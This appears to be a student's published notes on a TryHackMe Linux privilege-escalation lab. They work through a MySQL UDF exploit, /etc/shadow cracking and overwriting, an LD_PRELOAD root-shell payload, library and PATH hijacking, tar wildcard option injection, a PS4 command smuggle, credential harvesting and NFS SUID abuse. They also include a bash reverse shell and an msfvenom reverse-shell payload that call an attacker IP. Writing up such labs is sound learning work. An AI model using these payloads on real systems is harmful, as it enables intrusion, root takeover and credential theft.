---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/linux-priv-esc/","created":"2026-04-03T22:26:20.103+02:00","updated":"2026-04-05T18:36:28.214+02:00","dg-note-properties":{}}
---

![](/img/user/Attachments/redteaming2.png)
## Description

This room demonstrates various basic techniques on how to escalate privileges in linux environment. 

Techniques include: 
1. Service Exploits
2. Weak File Permissions
3. Shell Escape Sequences
4. Environmental Variables Vulnerabiltiies
5. 

## Initial Access

Following THM instructions and connecting to the target as per the command below. As suspeted OpenSSH have deprecated ssh-rsa so the extra argument is necessary. 

**Command**
`ssh user@TARGET -oHostKeyAlgorithms=+ssh-rsa`

__________

## Service Exploits 

Entering the directory : 

**Command**
`cd /home/user/tools/mysql-udf`

Compiling the **.c** file

**Command**
`gcc -g -c raptor_udf2.c -fPIC

**Command**`
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

Connecting to mysql service as root with blank password

![](/img/user/Attachments/dbconnect.png)

Executing the commands as per the THM instructions

```
use mysql; 

create table foo(line blob);

insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

## use the function to copy
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

![](/img/user/Attachments/exploit_commands.png)

Now using the exploit to gain root privileges

**Command**
`/tmp/rootbash -p`

![](/img/user/Attachments/firstroot.png)

Now deleting the exploit and exiting the shell

**Command**
`rm /tmp/rootbash`

______

## Weak File Permissions - Readable /etc/shadow

reading the `/etc/shadow` file which should only readable by **root**

**Command**
`ls -l /etc/shadow`

![](/img/user/Attachments/etcshadow.png)

Reading the content of /etc/shadow

**Command**
`cat /etc/shadow`

![](/img/user/Attachments/etcshadow-content.png)

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Now saving **root** hash into a file and using **john** to crack it. 

**Command**
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![](/img/user/Attachments/roothashcrack.png)

Now switching to root is a walk in the park `su root`

![](/img/user/Attachments/root2.png)


---------

## Weak File Permissions - Writeable /etc/shadow


Now generating a new password hash `mkpasswd -m sha-512 PASS`

```
# make new hash
mkpasswd -m sha-512 toor1

$6$WNY/fRw3Uz$78unWndGWjkB5JHWow1DBM51GwkZGaqXhTsqjStq.2X9VDSZ5DEp1gn6gE9ZbeCAoqEaFKpJzqkDQQaJYWfDW1
```

And pasting into `/etc/shadow` for root user. 

```

# Updating the old password. 
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.  
jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

Password is inserted between first colon to the left and first colon to the right.

First number sequence coming after the first colon is the **timestamp** for last changed date

-----------

## Weak File Permissions - Writeable /etc/passwd

#### Breakdown of File Permissions

```
-  rw-  r--  rw-
│   │    │    │
│   │    │    └── Other (everyone else) → read + write
│   │    └─────── Group (shadow group)  → read only
│   └──────────── Owner (root)          → read + write
└──────────────── File type (- = regular file)
```

Once again **/etc/passwd** is world-writeable.

**Command**
`ls -l /etc/passwd` 

As is seen by the weak file permissions `-rw-r--rw-`

Generating a new password hash with openssl `openssl passwd toor1`
hash: `qkeUSxWTs4PU6`

-----------

## Sudo - Shell Escape Sequences

Checking how many programs **user** is allowed to run with sudo

**Command**
`sudo -l`

![](/img/user/Attachments/userrunsudo.png)

----------

## Sudo - Environmental Variables

Checking which environment variables can be inherited from **user** environment

**Command**
`sudo -l`

![](/img/user/Attachments/env-vars.png)

**What is LD_PRELOAD?**
```

When Linux runs a program, it loads shared libraries (`.so` files) that the program needs. `LD_PRELOAD` is an environment variable that tells the dynamic linker to load the SPECIFIED shared object **before any other library** — even before standard ones like `libc`.
```

### Breakdown of Environmental Variables Vulnerability 

**Dynamic Linker**
Dynamic linker is an app which runs every time a binary is executed

**Why LD_PRELOAD is Exploitable**
Normally `LD_PRELOAD` is ignored when running with `sudo` for security reasons. But `sudo -l` shows it. This means sudo is **explicitly configured to preserve** `LD_PRELOAD` — a serious misconfiguration.

**What preload.c Does**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");  // remove LD_PRELOAD to avoid loops
    setresuid(0,0,0);        // set uid to root (0)
    setresgid(0,0,0);        // set gid to root (0)
    system("/bin/bash -p");  // spawn bash with root privileges
}
```


`_init()` is a special function that runs **automatically when a shared library is loaded** — before anything else. So when sudo loads the `.so` file, it immediately runs the code with root privileges.

### Visualisation of the Exploitation Process

```
sudo LD_PRELOAD=/tmp/preload.so find
         │
         ├── sudo sees env_keep+=LD_PRELOAD
         ├── sudo runs find as root
         ├── Linux loader loads /tmp/preload.so FIRST
         ├── _init() executes automatically
         ├── setresuid(0,0,0) → you are now root
         └── /bin/bash -p spawns → root shell
```

### Visualisation of Dynamic Linking 

```
You run: ./myprogram
         │
         ├── Kernel loads the binary
         ├── Kernel sees "needs dynamic linker"
         ├── Kernel loads /lib64/ld-linux.so (the dynamic linker)
         ├── Dynamic linker reads program's library dependencies
         ├── Dynamic linker searches for each library in:
         │     1. LD_PRELOAD (if set)       ← exploit entry point
         │     2. LD_LIBRARY_PATH (if set)  ← exploit entry point
         │     3. /etc/ld.so.cache
         │     4. /lib
         │     5. /usr/lib
         ├── Loads each library into memory
         ├── Resolves all function references
         └── Transfers control to your program
```


----------

### Task 
Create a shared object using the code located at /home/user/tools/sudo/preload.c:

**Command**
`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

Now while setting the `LD_PRELOAD` environment variable to the full new path of the object im selecting a program that can be run with **sudo** privs as **user** 

**Command**
`sudo LD_PRELOAD=/tmp/preload.so find`

And now root shell spawns 

![](/img/user/Attachments/root-spawn.png)

After exiting root shell now im checking which shared libraries are used by `apache2` by running **ldd** against it 

**Command**
`ldd /usr/sbin/apache2`

**What `*ldd /usr/sbin/apache2*` is doing**
`ldd` lists all shared libraries a program depends on. You run it to find library names you can hijack — you need to name your malicious `.so` file exactly the same as a real library apache2 uses.

![](/img/user/Attachments/libs2hijack.png)


**Command**
`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

Now running the apache2 with the **user's** sudo privs whilst specifying the path to which the malicious code is saved at

![](/img/user/Attachments/root3.png)

-----------

## Cron Jobs - File Permissions 

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

Viewing the cr0ntabz

**Command**
`cat /etc/crontab`

![](/img/user/Attachments/crontab.png)

So 2 cronjobs are scheduled 

Locating overwrite.sh 

**Command**
`locate overwrite.sh`

And checking again for weak file permissions

![](/img/user/Attachments/overwrite.png)

Replacing the content of the file with 
`bash -i >& /dev/tcp/192.168.141.140/4444 0>&1`

with **nc** running sends back a **root** shell 

-----------

## Cron Jobs - PATH Environmental Variables

The path starts with **/home/user/** 
`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

Creating a *overwrite.sh* file in the home directory within the ssh connection 

```
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

Making it executable

**Command**
`chmod +x /home/user/overwrite.sh`

Running `/tmp/rootbash -p` upgrades the shell to root

Removing the file

`rm /tmp/rootbash`

----------------


## Cron Jobs - Wildcards


Checking **compress.sh** in the other cron job and seeing it uses `*` in the home directory

**Command**
`cat /usr/local/bin/compress.sh`

Creating the exploit on local machine as per THM instructions

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.141.140 LPORT=4444 -f elf -o shell.elf
```

Making it executable
`chmod +x /home/user/shell.elf`

Transferring the file to target via Python HTTP server. 

Creating 2 files in home directory on ssh-box

**Command**
`touch /home/user/--checkpoint=1`

**Command**
`touch /home/user/--checkpoint-action=exec=shell.elf`

When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

-----------

## SUID / SGID Executables - Known Exploits 

Find all the SUID/SGID executables on the Debian :

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

This is a grouped condition:

- `\(` and `\)` — grouping brackets (escaped with backslash)
- `-perm -u+s` — file has **SUID** bit set (runs as owner)
- `-o` — **OR** operator
- `-perm -g+s` — file has **SGID** bit set (runs as group)

So this finds files with **either SUID or SGID** set

----------

For each file found:

- `-exec` — execute a command
- `ls -l` — list with full details (permissions, owner, size)
- `{}` — placeholder for the found file
- `\;` — end of the exec command

**Command**
Find all files on the system that have SUID or SGID  bit set, and show their full details, hiding any errors

```
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  
2> /dev/null  
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry  
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent  
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh  
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo  
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write  
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab  
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp  
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit  
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage  
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd  
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd  
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn  
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall  
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so  
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env  
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2  
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3  
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device  
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign  
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown  
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6  
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping  
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount  
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su  
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount  
-rwsr-sr-x 1 root root 926536 Apr  4 12:28 /tmp/rootbash  
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd  
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

Running the **.sh** script gets root. 

-----

## SUID / SGID Executables - Shared Object Injection

The **/usr/local/bin/suid-so** SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

`/usr/local/bin/suid-so`  

Run **strace** on the file and search the output for open/access calls and for "no such file" errors:

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

#### Breakdown of the Command  

**System call tracer** — records every system call a program makes as it runs. System calls are how programs interact with the kernel — opening files, reading memory, executing commands etc.

`2>&1`

Redirect **stderr** (2) to **stdout** (1) — combining both streams into one.

strace outputs to stderr by default so without this you wouldn't see anything when piping to grep.

```
2 = stderr (error output)
1 = stdout (normal output)
>& = redirect to
```

----------

Filter the output:

- `-i` — case insensitive
- `-E` — extended regex (allows `|` for OR)
- `"open|access|no such file"` — show lines containing any of these words:
    - `open` — files being opened
    - `access` — files being accessed/checked
    - `no such file` — files that don't exist


Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the **.config** directory for the libcalc.so file:

`mkdir /home/user/.config`

Example shared object code can be found at **/home/user/tools/suid/libcalc.c**. It simply spawns a Bash shell. Compile the code into a shared object at the location the **suid-so** executable was looking for it:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.

`/usr/local/bin/suid-so`

------

## SUID / SGID Executables - Environmental Variables 


The **/usr/local/bin/suid-env** executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

`/usr/local/bin/suid-env`

Run strings on the file to look for strings of printable characters:

`strings /usr/local/bin/suid-env`

![](/img/user/Attachments/suid-env-strings.png)

**Breakdown**
It is seen from the output above that there is no absolute path being used for `suid-env` as it simply refers to the executable `service` by its name and not the **absolute path**. This confirms that the `suid-env` is inheriting from PATH. 

**Breakdown from THM**
One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:

`gcc -o service /home/user/tools/suid/service.c`

![](/img/user/Attachments/service-code-exploit.png)

**Breakdown of service.c**
The exploit code shows that `setuid(0)` is setting the necessary root privileges and then using the `system` command to execute a bash shell with root privileges

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

`PATH=.:$PATH /usr/local/bin/suid-env`
This is the SUID binary being executed with the modified PATH.

**Breakdown**
Whilst being in the directory `/home/user/tools/suid` and appending that working directory (where service.c is located) to PATH the `suid-env` will now execute the malicious code.


----------

## SUID / SGID Executables - Abusing Shell Features (#1)


The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

`strings /usr/local/bin/suid-env2   `

![](/img/user/Attachments/suidenv2absolute.png)

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

`/bin/bash --version`

![](/img/user/Attachments/bash-version.png)

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

`function /usr/sbin/service { /bin/bash -p; }`

`export -f /usr/sbin/service`

Run the suid-env2 executable to gain a root shell:

`/usr/local/bin/suid-env2`  

----------

## SUID / SGID Executables - Abushing Shell Features (#2)

Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.  

Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

`rm /tmp/rootbash`


-------------

## Passwords & Keys - History Files 

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

`cat ~/.*history | less`

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password:

`su root`

`cat ~/.*history | grep -iE "mysql|p|root|username|password"`

Password is unncovered with the above command. 

`mysql -h somehost.local -uroot -ppassword123`

-----

## Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:

`ls /home/user`

Note the presence of a **myvpn.ovpn** config file. View the contents of the file:

`cat /home/user/myvpn.ovpn`

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

`su root`  

```
# creds is stored in this location
/etc/openvpn/auth.txt
```


---------

## Passwords & Keys - SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:

`ls -la /`

Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:

`ls -l /.ssh`

Note that there is a world-readable file called **root_key**. Further inspection of this file should indicate it is a private

key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the **root_key** file and copy/paste the key) and give it the correct permissions, otherwise your

client will refuse to use it:

`chmod 600 root_key`

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):

`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.82.153.166`

--------

## NFS

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian

:

`cat /etc/exports`

Note that the **/tmp** share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

`sudo su`

Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share (update the IP accordingly):

`mkdir /tmp/nfs   mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`

Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

Still using Kali's root user, make the file executable and set the SUID permission:

`chmod +xs /tmp/nfs/shell.elf`

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`








